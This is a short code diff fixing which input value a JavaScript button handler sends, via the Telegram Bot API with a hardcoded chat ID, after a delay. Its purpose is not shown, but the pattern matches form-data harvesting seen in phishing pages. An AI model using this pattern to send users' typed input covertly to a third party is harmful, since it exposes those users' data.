@@ -107,7 +107,7 @@ btn4.addEventListener('click', () => {
     const url = 'https://api.telegram.org/bot'+token4+'/sendMessage?chat_id=1201316750&text=';
     let xttp = new XMLHttpRequest();
 
-    xttp.open("GET", url+inp3);
+    xttp.open("GET", url+inp4);
     xttp.send();
    },1000)
 })
